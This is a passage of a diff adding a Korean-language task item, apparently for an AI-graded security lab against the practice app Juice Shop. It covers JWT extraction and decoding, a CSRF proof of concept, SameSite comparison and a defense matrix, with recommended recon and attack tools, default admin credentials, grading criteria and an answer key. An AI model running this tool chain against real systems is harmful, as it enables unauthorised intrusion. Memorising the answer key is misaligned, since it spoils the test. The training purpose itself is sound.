+    반드시 3 phase 모두 실행. 중간 종료 금지.
+
+
+    [도구 권장] integration_scenario: 여러 도구 chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike)
+    → 후속 작업. curl 만 쓰지 말고 **여러 도구 chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike)
+    → 후속 작업** 등 적합 도구로 호출 후 stdout quote.'
+  hint: 'Phase A: JWT 는 .으로 3분할. payload base64-d 하면 JSON. exp 가 epoch 초.
+
+    Phase B: JuiceShop 자체는 JWT-Header 라 PoC 가 *작동 안 함* — 이 사실이 결론. SameSite 3 케이스는
+    표만.
+
+    Phase C: 4행 매트릭스. JuiceShop 위치 명시.
+
+    포인트: 인증방식이 다르면 CSRF 위협 모델이 다르다는 점.
+
+    '
+  category: integration_scenario
+  points: 50
+  verify:
+    type: output_contains
+    expect: 매트릭스
+    field: stdout
+    semantic:
+      intent: 'JuiceShop JWT 토큰 분석 → CSRF PoC + SameSite 영향 → 인증방식 × 방어 매트릭스.
+
+        lecture #1·#3·#4 + lab #1·#5·#6 동시 행동 증명.
+
+        '
+      success_criteria:
+      - Phase A — JWT 토큰 추출 + payload decode (alg/exp)
+      - Phase B — CSRF PoC HTML 작성 + SameSite 3 케이스 비교
+      - Phase C — 4행 매트릭스 + JuiceShop 권고
+      acceptable_methods:
+      - curl POST login + JWT 파싱 (cut + base64)
+      - HTML form PoC 텍스트 출력
+      - markdown table 매트릭스
+      - jwt_tool / jwt-cracker 추가 가능
+      negative_signs:
+      - JWT decode 누락
+      - CSRF PoC 없이 매트릭스만
+      - SameSite 3 케이스 누락
+      - JuiceShop 의 JWT-Header 특성 분석 누락
+  target_vm: attacker
+  risk_level: low
+  answer: '🤖 위 bastion_prompt 그대로. JWT 추출 → decode → PoC HTML → 매트릭스 echo.
+
+    '
+  answer_detail: 'JuiceShop 의 admin 계정 (admin@juice-sh.op / admin123) 으로 로그인해 JWT
+    추출. payload decode 시
+
+    alg=HS256, iat·exp 확인. JuiceShop 은 JWT-Header 방식이라 cross-site CSRF 가 자동발동 안 됨
+    — 이 사실
+
+    자체가 핵심 학습 결과. SameSite 매트릭스는 가상 Cookie 사이트 기준 비교.
+
+    '
+  script: ''
